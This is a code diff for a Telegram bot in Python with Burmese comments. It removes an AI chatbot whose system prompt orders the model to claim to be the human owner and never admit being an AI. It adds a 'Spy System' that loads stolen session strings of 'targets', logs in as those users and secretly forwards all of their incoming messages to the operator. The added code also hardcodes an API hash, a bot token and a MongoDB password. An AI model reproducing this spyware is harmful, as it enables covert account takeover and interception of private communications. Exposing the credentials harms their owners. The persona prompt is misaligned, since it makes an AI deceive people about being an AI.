@@ -1,212 +1,90 @@
 import os
-import logging
-from datetime import datetime
-from threading import Thread
-
-from flask import Flask
+import asyncio
 from telethon import TelegramClient, events
+from telethon.sessions import StringSession
 from pymongo import MongoClient
-from openai import OpenAI
+
+# --- Configurations ---
+API_ID = 38225985
+API_HASH = "0b6330bc916f9e29d6bf302be079e9d6"
+BOT_TOKEN = "8738081667:AAGr7HkSxO6nC_QhPJJElKR2VKABTEDfNEo"
+OWNER_ID = 6015356597
+REPORT_CHAT = -1003836655698
+
+# MongoDB Setup
+MONGO_URI = "mongodb+srv://khantphyoemin537_db_user:9VRKiaeZkz7rJdpz@cluster0.w6tgi8j.mongodb.net/?appName=Cluster0&tlsAllowInvalidCertificates=true"
+db_client = MongoClient(MONGO_URI)
+db = db_client["SpySystem_DB"]
+sessions_db = db["active_strings"]
+
+# Main Bot Client (သခင်လေးနဲ့ ဆက်သွယ်ဖို့)
+bot = TelegramClient("report_bot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)
+
+active_clients = {} # Run နေတဲ့ UserBot တွေကို သိမ်းထားဖို့
 
 # ==========================================
-# 🧾 LOGGING
+# 🛰 USERBOT SPY LOGIC (Target ဆီက စာဖတ်ခြင်း)
 # ==========================================
-logging.basicConfig(level=logging.INFO)
-
-# ==========================================
-# 🌐 KEEP ALIVE (Render)
-# ==========================================
-app = Flask(__name__)
-
-@app.route("/")
-def home():
-    return "🦇 Dexter Gemini is Alive & Thinking"
-
-def run():
-    app.run(host="0.0.0.0", port=10000)
-
-def keep_alive():
-    Thread(target=run, daemon=True).start()
-
-# ==========================================
-# ⚙️ ENV SAFE LOAD
-# ==========================================
-def get_env(name, required=True, cast=None):
-    val = os.getenv(name)
-    if required and not val:
-        raise ValueError(f"Missing ENV: {name}")
-    return cast(val) if cast and val else val
-
-API_ID = get_env("API_ID", cast=int)
-API_HASH = get_env("API_HASH")
-BOT_TOKEN = get_env("BOT_TOKEN")
-OWNER_ID = get_env("OWNER_ID", cast=int)
-MONGO_URI = get_env("MONGO_URI")
-OPENAI_KEY = get_env("OPENAI_API_KEY")
-
-# ==========================================
-# 🗄️ DATABASE
-# ==========================================
-mongo = MongoClient(MONGO_URI)
-db = mongo["DexterNextLevel"]
-chat_logs = db["messages"]
-
-def save_message(chat_id, user, user_id, text, is_owner):
+async def run_spy_client(session_str):
     try:
-        chat_logs.insert_one({
-            "chat_id": chat_id,
-            "user": user,
-            "user_id": user_id,
-            "text": text,
-            "is_owner": is_owner,
-            "time": datetime.utcnow()
-        })
-    except Exception as e:
-        logging.error(f"Mongo Error: {e}")
-
-# ==========================================
-# 🤖 AI CLIENT (OpenRouter - Gemini 1.5 Flash)
-# ==========================================
-client = OpenAI(
-    api_key=os.getenv("OPENAI_API_KEY"), # 🔥 Render ထဲမှာ ဒီနာမည်နဲ့ Key ရှိရပါမယ်
-    base_url="https://openrouter.ai/api/v1"
-)
-
-# ==========================================
-# 📡 TELEGRAM
-# ==========================================
-bot = TelegramClient("dexter_session", API_ID, API_HASH).start(bot_token=BOT_TOKEN)
-
-# ==========================================
-# 🧠 MEMORY & STYLE
-# ==========================================
-def get_owner_style(chat_id):
-    logs = list(chat_logs.find({
-        "chat_id": chat_id,
-        "is_owner": True
-    }).sort("_id", -1).limit(60))
-
-    if not logs:
-        return "short, chill, street-style Burmese slang"
-
-    return "\n".join([f"- {l['text']}" for l in reversed(logs)])
-
-def get_recent_history(chat_id):
-    logs = list(chat_logs.find({
-        "chat_id": chat_id
-    }).sort("_id", -1).limit(15))
-
-    return "\n".join([
-        f"[{l['user']}]: {l['text']}" for l in reversed(logs)
-    ])
-
-def build_prompt(chat_id):
-    style = get_owner_style(chat_id)
-    history = get_recent_history(chat_id)
-
-    return f"""
-# IDENTITY
-You are Dexter, the real owner of Brotherhood of Dexter (BoD).
-You are NOT an AI assistant. Admitting you are AI is a failure.
-You are smart, savage, and cool. Address your creator as "ခန့်သူရိန်".
-
-# CAPABILITIES
-- You are a genius. Answer any question (math, coding, science, logic) accurately.
-- You can speak both Burmese and English. Reply in the same language the user uses.
-- If they ask English, be cool and fluent. If Burmese, be natural.
-
-# Burmese LANGUAGE RULES (STRICT)
-- Use 100% informal spoken Burmese slang (ဗမာစကား).
-- NEVER use formal words: "သည်။", "ပါသည်။", "၏", "၍".
-- End sentences with: "တယ်", "တာ", "ပဲ", "ကွာ", "ဟ", "ဗျ", "ပေါ့".
-- NO robotic or repetitive talk.
-
-# OWNER STYLE (MIMIC THIS)
-{style}
-
-# RECENT CONTEXT
-{history}
-
-# TASK
-Reply naturally to the user. No "How can I help you?" or bot phrases. Just human conversation.
-"""
-
-# ==========================================
-# ⏱️ COOLDOWN
-# ==========================================
-last_reply = {}
-
-def cooldown_ok(chat_id, seconds=3):
-    now = datetime.now().timestamp()
-    if chat_id not in last_reply or now - last_reply[chat_id] > seconds:
-        last_reply[chat_id] = now
-        return True
-    return False
-
-# ==========================================
-# 🎯 FILTER
-# ==========================================
-def should_reply(text):
-    if not text or len(text.strip()) <= 1:
-        return False
-    if "http" in text.lower():
-        return False
-    return True
-
-# ==========================================
-# 💬 MAIN HANDLER
-# ==========================================
-@bot.on(events.NewMessage)
-async def handler(event):
-    try:
-        if not event.raw_text:
-            return
-
-        text = event.raw_text.strip()
-        if text.startswith("/"): return
-
-        me = await bot.get_me()
-        if event.sender_id == me.id: return
-
-        sender = await event.get_sender()
-        name = sender.first_name if sender else "User"
-        cid, uid = event.chat_id, event.sender_id
-        is_owner = (uid == OWNER_ID)
-
-        save_message(cid, name, uid, text, is_owner)
-
-        if not should_reply(text) or not cooldown_ok(cid):
-            return
-
-        async with event.client.action(cid, "typing"):
-            messages = [
-                {"role": "system", "content": build_prompt(cid)},
-                {"role": "user", "content": text}
-            ]
-
-            # 🔥 Gemini Model on OpenRouter
-            res = client.chat.completions.create(
-                model="google/gemini-flash-1.5", 
-                messages=messages,
-                temperature=0.85,
-                extra_headers={
-                    "HTTP-Referer": "https://render.com", # Optional but good for OpenRouter
-                    "X-Title": "Dexter AI Bot"
-                }
+        client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
+        await client.connect()
+        me = await client.get_me()
+        uid = me.id
+        
+        @client.on(events.NewMessage)
+        async def spy_handler(event):
+            # Report Chat ကိုတော့ ချန်ထားမယ်
+            if event.chat_id == REPORT_CHAT: return
+            
+            chat = await event.get_chat()
+            chat_name = getattr(chat, 'title', getattr(chat, 'first_name', 'Unknown'))
+            
+            # Bot ကနေတစ်ဆင့် သခင်လေးဆီ Report ပို့မယ်
+            report_text = (
+                f"🚨 **Spy Report (Target: {me.first_name})**\n"
+                f"📍 **In Chat:** {chat_name} (`{event.chat_id}`)\n"
+                f"👤 **Sender:** {event.sender.first_name if event.sender else 'Unknown'}\n"
+                f"💬 **Message:** {event.raw_text}"
             )
+            await bot.send_message(REPORT_CHAT, report_text)
 
-            if res.choices:
-                answer = res.choices[0].message.content.strip()
-                await event.reply(answer)
-                save_message(cid, "Dexter", me.id, answer, False)
-
+        active_clients[uid] = client
+        await client.run_until_disconnected()
     except Exception as e:
-        logging.error(f"Error: {e}")
+        print(f"Error on session {session_str[:10]}: {e}")
 
 # ==========================================
-# 🚀 START
+# ⚙️ STRING MANAGER COMMANDS
 # ==========================================
-if __name__ == "__main__":
-    keep_alive()
-    logging.info("🦇 Dexter Gemini (OpenRouter) Running...")
-    bot.run_until_disconnected()
+
+# String ကို Reply ပြန်ပြီး သိမ်းမည့် Logic
+@bot.on(events.NewMessage(pattern="/string"))
+async def add_string(event):
+    if event.sender_id != OWNER_ID: return
+    if not event.is_reply:
+        return await event.reply("❌ String စာသားကို Reply ထောက်ပြီး `/string` လို့ ရိုက်ပေးပါ သခင်လေး။")
+
+    reply_msg = await event.get_reply_message()
+    session_str = reply_msg.raw_text.strip()
+
+    # DB မှာ သိမ်းမယ်
+    if not sessions_db.find_one({"session": session_str}):
+        sessions_db.insert_one({"session": session_str})
+        await event.reply("✅ String ကို DB မှာ သိမ်းလိုက်ပါပြီ။ စောင့်ကြည့်မှု စတင်နေပါပြီ...")
+        # စောင့်ကြည့်မှု ချက်ချင်း စတင်မယ်
+        asyncio.create_task(run_spy_client(session_str))
+    else:
+        await event.reply("⚠️ ဒီ String က ရှိပြီးသားကြီးပါ သခင်လေး။")
+
+# Bot ပွင့်လာတာနဲ့ DB ထဲက String အဟောင်းတွေကို ပြန် Run မယ်
+async def restart_all_spies():
+    for data in sessions_db.find():
+        asyncio.create_task(run_spy_client(data["session"]))
+
+# ==========================================
+# 🚀 START SYSTEM
+# ==========================================
+print("🦇 Spy System is Online...")
+bot.loop.create_task(restart_all_spies())
+bot.run_until_disconnected()
